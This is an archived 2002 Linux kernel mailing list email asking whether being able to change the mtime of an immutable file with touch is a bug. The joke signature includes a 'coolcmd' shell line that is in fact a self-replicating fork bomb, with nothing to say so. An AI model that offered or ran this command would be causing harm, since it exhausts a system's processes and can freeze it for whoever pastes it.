Return-Path: <linux-kernel-owner@vger.kernel.org>
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
	id <S312486AbSCYSZi>; Mon, 25 Mar 2002 13:25:38 -0500
Received: (majordomo@vger.kernel.org) by vger.kernel.org
	id <S312487AbSCYSZ2>; Mon, 25 Mar 2002 13:25:28 -0500
Received: from darkface.pp.se ([212.105.77.200]:47588 "EHLO
	akilles.darkface.pp.se") by vger.kernel.org with ESMTP
	id <S312486AbSCYSZY>; Mon, 25 Mar 2002 13:25:24 -0500
Content-Type: text/plain; charset=US-ASCII
From: Thomas Habets <thomas@habets.pp.se>
To: linux-kernel@vger.kernel.org
Subject: mtime changeable on immutable files (a bug, isn't it?)
Date: Mon, 25 Mar 2002 19:24:57 +0100
X-Mailer: KMail [version 1.2]
MIME-Version: 1.0
Message-Id: <02032519245700.00785@marvin>
Content-Transfer-Encoding: 7BIT
Sender: linux-kernel-owner@vger.kernel.org
X-Mailing-List: linux-kernel@vger.kernel.org

-----BEGIN PGP SIGNED MESSAGE-----


You can touch(1) an immutable file, which changes its mtime. Since you can't
change the permission bits of the inode, you shouldn't be able to change the
mtime, correct?

I pointed this out in september of 1999, including a patch that fixes it.
I got no reply answering if this was correct behavior or a bug back then, I'd
appreciate a reply now.

(please CC any reply to me since I'm not on the list)

- ---------
typedef struct me_s {
  char name[]      = { "Thomas Habets" };
  char email[]     = { "thomas@habets.pp.se" };
  char kernel[]    = { "Linux 2.4" };
  char *pgpKey[]   = { "http://darkface.pp.se/~thompa/pubkey.txt" };
  char pgp[] = { "6517 2898 6AED EA2C 1015  DCF0 8E53 B69F 524B B541" };
  char coolcmd[]   = { "echo '. ./_&. ./_'>_;. ./_" };
} me_t;


-----BEGIN PGP SIGNATURE-----
Version: PGPfreeware 5.0i for non-commercial use
MessageID: zlshHKryBFyPyI2xmJEqOnkLgya/pfXj

iQA/AwUBPJ9rgChq6QqtSOhUEQJSAgCfaZb/IZedqEYwT0HaIlGEZuxtqV4An2Pq
iUWPGH8W2uNs0xDUdiDdt5Ex
=1clh
-----END PGP SIGNATURE-----
